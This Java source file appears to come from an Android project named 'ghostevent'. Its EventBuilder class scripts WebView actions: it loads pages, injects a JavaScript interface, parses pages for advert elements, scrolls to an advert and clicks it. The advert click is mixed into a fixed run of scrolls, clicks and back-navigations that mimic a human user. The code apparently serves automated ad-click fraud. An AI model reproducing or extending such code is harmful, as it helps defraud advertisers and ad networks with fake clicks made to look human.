package com.nicolls.ghostevent.ghost.core;

import android.content.Context;
import android.webkit.WebView;

import com.nicolls.ghostevent.ghost.event.AdvertClickRedirectEvent;
import com.nicolls.ghostevent.ghost.event.BaseEvent;
import com.nicolls.ghostevent.ghost.event.ClickRedirectEvent;
import com.nicolls.ghostevent.ghost.event.GroupEvent;
import com.nicolls.ghostevent.ghost.event.HomePageEvent;
import com.nicolls.ghostevent.ghost.event.LoadJsInterfaceEvent;
import com.nicolls.ghostevent.ghost.event.LoadJsScriptInfEvent;
import com.nicolls.ghostevent.ghost.event.LoadPageEvent;
import com.nicolls.ghostevent.ghost.event.PageGoBackEvent;
import com.nicolls.ghostevent.ghost.event.ScrollVerticalEvent;
import com.nicolls.ghostevent.ghost.event.TouchPoint;
import com.nicolls.ghostevent.ghost.event.WebParseEvent;
import com.nicolls.ghostevent.ghost.parse.IWebParser;
import com.nicolls.ghostevent.ghost.parse.ViewNode;
import com.nicolls.ghostevent.ghost.parse.advert.AdvertJsInterface;
import com.nicolls.ghostevent.ghost.parse.advert.AdvertParser;
import com.nicolls.ghostevent.ghost.parse.advert.IAdvertTarget;
import com.nicolls.ghostevent.ghost.utils.LogUtil;

import java.util.ArrayList;
import java.util.List;

public class EventBuilder {
    private static final String TAG = "EventBuilder";
    private final Context context;
    private final RedirectHandler redirectHandler;
    private final EventExecutor.ExecuteCallBack executeCallBack;
    private final List<ViewNode> viewNodes = new ArrayList<>();

    public EventBuilder(Context context, RedirectHandler redirectHandler,
                        EventExecutor.ExecuteCallBack executeCallBack) {
        this.context = context.getApplicationContext();
        this.redirectHandler = redirectHandler;
        this.executeCallBack = executeCallBack;
    }

    public ScrollVerticalEvent getScrollToNodeEvent(IWebTarget target, ViewNode node) {
        final WebView webView = (WebView) target;
        final int webViewHeight = webView.getHeight();
        final int contentHeight = webView.getContentHeight();
        final int scrollY = webView.getScrollY();
        final int nodeY = (int) node.centerY;
        LogUtil.d(TAG, "getScrollToNodeEvent " + node.toString());
        LogUtil.d(TAG, "webViewHeight:" + webViewHeight + " contentHeight:" + contentHeight + " scrollY:" + scrollY + " nodeY:" + nodeY);
        int from = scrollY;
        int to = 0;
        if (nodeY > 0) {
            if (nodeY > webViewHeight) {
                int more = nodeY - webViewHeight;
                to = scrollY + more;
            } else if (nodeY < webViewHeight / 2) {
                to = scrollY - webViewHeight / 2;
            } else {
                to = scrollY;
            }
        } else {
            to = scrollY - Math.abs(nodeY) - webViewHeight / 2;
        }
        return new ScrollVerticalEvent(target, from, to);

    }

    public GroupEvent getLoadPageEvent(IWebTarget target, String url) {
        GroupEvent groupEvent = new GroupEvent(target, executeCallBack);
        final WebView webView = (WebView) target;
        AdvertJsInterface advertInterface = new AdvertJsInterface(webView.getContext(), advertTarget);
        LoadJsInterfaceEvent loadJsInterfaceEvent = new LoadJsInterfaceEvent(target, advertInterface);
        LoadPageEvent loadPageEvent = new LoadPageEvent(target, redirectHandler, url);
        LoadJsScriptInfEvent loadJsInfEvent = new LoadJsScriptInfEvent(target, advertInterface);
        IWebParser parseAdvert = new AdvertParser();
        WebParseEvent parseEvent = new WebParseEvent(target, parseAdvert);
        groupEvent.addEvent(loadJsInterfaceEvent);
        groupEvent.addEvent(loadPageEvent);
        groupEvent.addEvent(loadJsInfEvent);
        groupEvent.addEvent(parseEvent);
        return groupEvent;
    }

    public GroupEvent getClickAndGoBackEvent(IWebTarget target, TouchPoint touchPoint) {
        GroupEvent groupEvent = new GroupEvent(target, executeCallBack);
        final WebView webView = (WebView) target;
        ClickRedirectEvent clickRedirectEvent = new ClickRedirectEvent(target, redirectHandler, touchPoint);
        PageGoBackEvent goBackEvent = new PageGoBackEvent(target, redirectHandler);
        AdvertJsInterface advertInterface = new AdvertJsInterface(webView.getContext(), advertTarget);
        LoadJsScriptInfEvent loadJsInfEvent = new LoadJsScriptInfEvent(target, advertInterface);
        groupEvent.addEvent(clickRedirectEvent);
        groupEvent.addEvent(goBackEvent);
        groupEvent.addEvent(loadJsInfEvent);
        return groupEvent;
    }

    public GroupEvent getGoBackEvent(IWebTarget target) {
        GroupEvent groupEvent = new GroupEvent(target, executeCallBack);
        final WebView webView = (WebView) target;
        PageGoBackEvent goBackEvent = new PageGoBackEvent(target, redirectHandler);
        AdvertJsInterface advertInterface = new AdvertJsInterface(webView.getContext(), advertTarget);
        LoadJsScriptInfEvent loadJsInfEvent = new LoadJsScriptInfEvent(target, advertInterface);
        groupEvent.addEvent(goBackEvent);
        groupEvent.addEvent(loadJsInfEvent);
        return groupEvent;
    }

    public GroupEvent getHomeEvent(IWebTarget target) {
        GroupEvent groupEvent = new GroupEvent(target, executeCallBack);
        final WebView webView = (WebView) target;
        HomePageEvent homePageEvent = new HomePageEvent(target, redirectHandler);
        AdvertJsInterface advertInterface = new AdvertJsInterface(webView.getContext(), advertTarget);
        LoadJsScriptInfEvent loadJsInfEvent = new LoadJsScriptInfEvent(target, advertInterface);
        groupEvent.addEvent(homePageEvent);
        groupEvent.addEvent(loadJsInfEvent);
        return groupEvent;
    }

    public WebParseEvent getParseEvent(IWebTarget target) {
        IWebParser parseAdvert = new AdvertParser();
        WebParseEvent parseEvent = new WebParseEvent(target, parseAdvert);
        return parseEvent;
    }

    public BaseEvent getCloseAdvertClickEvent(IWebTarget target) {
        // get advert nodes
        List<ViewNode> adNodes = new ArrayList<>();
        for (ViewNode node : viewNodes) {
            if (node.type == ViewNode.Type.ADVERT) {
                adNodes.add(node);
            }
        }
        LogUtil.d(TAG, "advert nodes size:" + adNodes.size());
        // get close advert
        final WebView webView = (WebView) target;
        ViewNode closeNode = null;
        for (ViewNode node : adNodes) {
            if (node.centerY > 0) {
                closeNode = node;
                break;
            }
        }
        if (closeNode == null && adNodes.size() > 0) {
            closeNode = adNodes.get(adNodes.size() - 1);
        }
        if (closeNode != null) {
            LogUtil.d(TAG, "click advert " + closeNode.toString());
            ScrollVerticalEvent scrollEvent = getScrollToNodeEvent(target, closeNode);
            WebParseEvent parseEvent = getParseEvent(target);
            AdvertClickRedirectEvent advertClickRedirectEvent = new AdvertClickRedirectEvent(target, redirectHandler);
            GroupEvent groupEvent = new GroupEvent(target, executeCallBack, scrollEvent, parseEvent, advertClickRedirectEvent);
            return groupEvent;
        }
        return null;
    }

    public List<BaseEvent> getRandomEvents(IWebTarget target, int size, boolean haveAdvert) {
        List<BaseEvent> list = new ArrayList<>();
        final WebView webView = (WebView) target;
        ScrollVerticalEvent scrollVerticalUpEvent = new ScrollVerticalEvent(target, webView.getHeight() / 3);
        ScrollVerticalEvent scrollVerticalDownEvent = new ScrollVerticalEvent(target, webView.getHeight() / -4);
        BaseEvent clickAndGoBack = getClickAndGoBackEvent(target, TouchPoint.obtainClick(webView.getWidth() / 2, webView.getHeight() / 3));
        BaseEvent clickRedirect = new ClickRedirectEvent(target, redirectHandler, TouchPoint.obtainClick(webView.getWidth() / 4, webView.getHeight() - webView.getHeight() / 4));
        BaseEvent backEvent = new PageGoBackEvent(target, redirectHandler);
        BaseEvent advertEvent = getCloseAdvertClickEvent(target);
        list.add(scrollVerticalUpEvent);
        list.add(scrollVerticalUpEvent);
        list.add(scrollVerticalDownEvent);
        list.add(clickAndGoBack);
        list.add(scrollVerticalUpEvent);
        list.add(scrollVerticalUpEvent);
        list.add(clickRedirect);
        list.add(scrollVerticalUpEvent);
        list.add(scrollVerticalDownEvent);
        list.add(backEvent);
        list.add(scrollVerticalUpEvent);
        if (haveAdvert && advertEvent != null) {
            list.add(advertEvent);
        }
        list.add(scrollVerticalDownEvent);
        list.add(backEvent);
        list.add(scrollVerticalUpEvent);
        return list;
    }

    private final IAdvertTarget advertTarget = new IAdvertTarget() {
        @Override
        public void onParseStart() {
            LogUtil.d(TAG, "onParseWebStart");
            viewNodes.clear();
        }

        @Override
        public void onParseSuccess() {
            LogUtil.d(TAG, "onParseSuccess");
        }

        @Override
        public void onParseFail() {
            LogUtil.d(TAG, "onParseFail");
            viewNodes.clear();
        }

        @Override
        public void onCurrentPageHtml(String result) {
            LogUtil.d(TAG, "onCurrentPageHtml");
//            LogUtil.d(TAG, result);
        }

        @Override
        public void onJsCallBackHandleError() {
            LogUtil.d(TAG, "onJsCallBackHandleError");
        }

        @Override
        public void onFoundItem(ViewNode result) {
            LogUtil.d(TAG, "foundItem " + result.toString());
            viewNodes.add(result);
        }

        @Override
        public void onFoundItemHtml(String result) {
//            LogUtil.d(TAG, "onFoundItemHtml " + result);
        }

        @Override
        public void onFoundAdvert(ViewNode result) {
            LogUtil.d(TAG, "onFoundAdvert " + result.toString());
            viewNodes.add(result);
        }
    };

    public List<ViewNode> getViewNodes() {
        return viewNodes;
    }

    public void quit() {
        LogUtil.d(TAG, "quit");
    }

}
